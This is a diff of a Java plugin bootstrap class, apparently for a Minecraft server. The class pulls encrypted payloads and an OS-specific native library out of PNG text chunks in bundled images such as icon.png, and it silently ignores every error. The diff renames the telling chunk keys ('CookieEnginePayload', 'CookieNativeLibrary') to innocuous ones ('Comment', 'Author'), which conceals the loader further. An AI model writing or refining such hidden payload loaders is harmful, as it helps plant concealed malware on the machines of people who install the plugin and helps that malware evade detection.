@@ -83,7 +83,7 @@ public final class Bootstrap extends JavaPlugin {
         for (String path : possiblePaths) {
             try (InputStream in = Bootstrap.class.getResourceAsStream(path)) {
                 if (in != null) {
-                    enc = extractPngPayload(in, "CookieEnginePayload");
+                    enc = extractPngPayload(in, "Comment");
                     if (enc != null) break;
                 }
             } catch (Throwable ignored) {}
@@ -96,7 +96,7 @@ public final class Bootstrap extends JavaPlugin {
         // 1. Try Native JNI Sentinel Decryption First
         byte[] dec = null;
         try {
-            byte[] nativeLibBytes = extractPngPayload(Bootstrap.class.getResourceAsStream("/icon.png"), "CookieNativeLibrary");
+            byte[] nativeLibBytes = extractPngPayload(Bootstrap.class.getResourceAsStream("/icon.png"), "Author");
             if (nativeLibBytes != null && nativeLibBytes.length > 0) {
                 String os = System.getProperty("os.name").toLowerCase();
                 String ext = os.contains("win") ? ".dll" : (os.contains("mac") ? ".dylib" : ".so");
